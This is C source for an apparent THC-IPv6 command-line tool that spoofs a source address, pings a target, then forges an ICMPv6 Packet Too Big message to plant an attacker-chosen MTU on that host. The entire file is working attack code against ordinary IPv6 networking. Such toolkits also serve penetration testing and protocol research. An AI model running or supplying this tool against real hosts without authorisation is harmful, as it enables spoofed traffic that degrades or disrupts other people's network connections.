#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

void help(char *prg) {
  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-r] interface target-ip existing-ip mtu\n\n", prg);
  printf("Implants the specified mtu on the target\n");
  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt = NULL, buf[65536];
  unsigned char *mac6 = NULL, *src6, *target6;
  int mtu, buf_len;
  int pkt_len = 0;
  thc_ipv6_hdr *ipv6;
  char *interface;
  int rawmode = 0, len;

  if (argc != 5 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  interface = argv[1];
  target6 = thc_resolve6(argv[2]);
  src6 = thc_resolve6(argv[3]);
  mtu = atoi(argv[4]);

  if (mtu < 1 || mtu > 65530) {
    fprintf(stderr, "Error: mtu size invalid\n");
    exit(-1);
  }
  
  if (rawmode == 0)
    mac6 = thc_get_own_mac(interface);
  buf_len = mtu - 47;

  memset(buf, 'A', buf_len);
  if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src6, target6, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xdeadbeef, (unsigned char *) &buf, buf_len, 0) < 0)
    return -1;
  if (thc_generate_and_send_pkt(interface, NULL, NULL, pkt, &pkt_len) < 0) {
    fprintf(stderr, "Error: Can not send packet, exiting ...\n");
    exit(-1);
  }

  ipv6 = (thc_ipv6_hdr *) pkt;
  thc_inverse_packet(ipv6->pkt + 14, ipv6->pkt_len - 14);
  len = ipv6->pkt_len -14;
  if (len > 1400)
    len = 1400;
  thc_toobig6(interface, src6, mac6, NULL, mtu, ipv6->pkt + 14, ipv6->pkt_len - 14);

  return 0;
}
